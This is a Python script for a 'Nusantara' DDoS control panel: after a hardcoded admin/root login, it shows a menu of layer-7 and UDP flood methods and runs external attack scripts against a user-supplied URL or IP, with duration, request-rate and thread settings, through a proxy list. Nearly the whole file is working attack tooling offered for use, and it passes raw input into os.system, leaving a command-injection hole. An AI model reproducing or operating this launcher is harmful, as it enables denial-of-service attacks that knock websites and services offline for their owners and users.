import socket
from colorama import Fore, Back, Style  
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('p.txt').readlines()
bots = len(proxys)

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mNusantara  \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Nusantara  DDoS Panel! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: 444 Was Here \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    print("")

def menu():
    sys.stdout.write(f"         \x1b]2;Nusantara  C2 --> Bot: {bots} | Online Users: [1] | Methods: [8] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("\033[31m                                Nusantara C2\n\033[0mWelcome To Nusantara C2 | User Online: 1 | Botnet: " + str(bots) + " | Author: 444 Was Here")
    print("                           Type Help To See All Command")
    print("")
    print(colored_text)

text = "█▀▀▄ █░░█ █▀▀ █▀▀█ █▀▀▄ ▀▀█▀▀ █▀▀█ █▀▀█ █▀▀█\n█░░█ █░░█ ▀▀█ █▄▄█ █░░█ ░░█░░ █▄▄█ █▄▄▀ █▄▄█\n▀░░▀ ░▀▀▀ ▀▀▀ ▀░░▀ ▀░░▀ ░░▀░░ ▀░░▀ ▀░▀▀ ▀░░▀"

half_length = len(text) // 2
left_text = text[:half_length]
right_text = text[half_length:]

colored_text = "\033[31m" + left_text + "\033[37m" + right_text + "\033[0m"
red_text = "\033[31m"
white_text = "\033[37m"

def main():
    menu()
    while True:
        cnc = input('''\033[31mNusantara@\033[37mRoot==>''')
        if cnc == "elp":
            elp()

        # ALL LAYER METHODS

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')
                
        elif "randv2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node br.js {url} {time} p.txt ua.txt 95500 512')
            except IndexError:
                print('Usage: randv2 <url> <duration>')
                print('Example: randv2 example.com 120')
                
        elif "http-spam" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python3 sef.py {url}')
            except IndexError:
                print('Usage: http-spam <url>')
                print('Example: http-spam example.com')
                
        elif "http-tls" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-TLS.js {url} {time}')
            except IndexError:
                print('Usage: http-tls <url> <time>')
                print('Example: http-tls example.com 120')
                
        elif "http-titan" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node iso.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: http-titan URL TIME RPS THREADS')
                print('Example: http-titan example.com 120 512 95500')
                
        elif "http-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node flood3js {url} {time} p.txt {thread}')
            except IndexError:
                print('Usage: http-bypass URL TIME THREADS')
                print('Example: http-bypass example.com 120 95500')
                
        elif "http-crot" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node http3.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: http-crot URL TIME RPS THREADS')
                print('Example: http-crot example.com 120 512 95500')
                
        elif "http-vip" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node http1.js {url} p.txt {time} 100 {thread}')
            except IndexError:
                print('Usage: http-vip URL TIME THREADS')
                print('Example: http-vip example.com 120 95500')
                
        elif "http-sound" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                os.system(f'java zxkys.java {url} {thread}')
            except IndexError:
                print('Usage: http-sound <url> <thread>')
                print('Example: http-sound example.com 95500')
                
        elif "rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node rand.js {url} {time}')
            except IndexError:
                print('Usage: rand <url> <duration>')
                print('Example: rand example.com 120')
            
        elif "layer7" in cnc:
            print(f'''
{red_text}
════════════════════════════════════════════════
║                Layer7  [VVIP]                 ║
║                                               ║
║ {white_text}rand                             http-sound   {red_text}║
║ {white_text}randv2                           http-bypass  {red_text}║
║ {white_text}http-spam                        http-titan   {red_text}║
║ {white_text}http-crot                        http-vip     {red_text}║
║ {white_text}http-tls                                      {red_text}║
║                                               ║
║                                               ║
════════════════════════════════════════════════
''')

        elif "help" in cnc:
            print(f'''
LAYER 7 == Layer 7 Methods
LAYER 4 == Layer 4 Methods
CLEAR == Clear Terminals
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

def login():
    clear()
    user = "admin"
    passwd = "root"
    username = input(" Username: ")
    password = getpass.getpass(prompt=' Password: ')
    if username != user or password != passwd:
        print("")
        print(" Password Salah Minta Admin Untuk Mengganti Password")
        sys.exit(1)
    elif username == user and password == passwd:
        print(" Welcome to Nusantara  DDoS Panel C2!")
        time.sleep(0.3)
        main()

login()